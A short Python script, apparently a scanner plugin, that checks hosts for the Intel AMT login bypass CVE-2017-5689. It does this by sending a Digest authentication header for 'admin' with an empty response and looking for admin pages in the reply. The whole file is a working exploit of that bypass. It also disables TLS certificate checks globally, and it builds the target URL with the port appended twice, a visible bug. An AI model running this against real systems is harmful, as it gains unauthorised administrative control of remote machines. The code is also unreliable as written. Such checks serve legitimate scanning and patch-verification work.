# coding:utf-8

import re
import random
import string
import requests
import warnings
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    warnings.filterwarnings("ignore")
    print('testing if intel AMT web system logon bypass vul(CVE-2017-5689)')
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/hw-sys.htm"
    vulnurl = url + ":" + str(port) + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=3, verify=False)
        header_string = req.headers['WWW-Authenticate']
        pattern = 'realm="([^"]+)"'
        realm = re.search(pattern, header_string).group(1)
        pattern = 'nonce="([^"]+)"'
        nonce = re.search(pattern, header_string).group(1)
        cnonce = ''.join(random.sample(string.ascii_letters + string.digits, 16))
        headers2 = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        'Authorization': 'Digest username="admin", realm="' + realm + '", nonce="' + nonce + '", uri="/index.htm?", response="", qop=auth, nc=00000001, cnonce="' + cnonce + '"'
        }
        req2 = requests.get(vulnurl, headers=headers2, timeout=5, verify=False)
        if r"href=remote.htm" in req2.text and r"href=hw-sys.htm" in req2.text:
            msg = 'There is intel AMT web system logon bypass vul(CVE-2017-5689) on url: ' + vulnurl + ' . '
            number = 'v113'
            print(msg)
            return True, url, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False, url, number, msg
    msg = 'There is no intel AMT web system logon bypass vul(CVE-2017-5689)'
    number = 'v0'
    return False, url, number, msg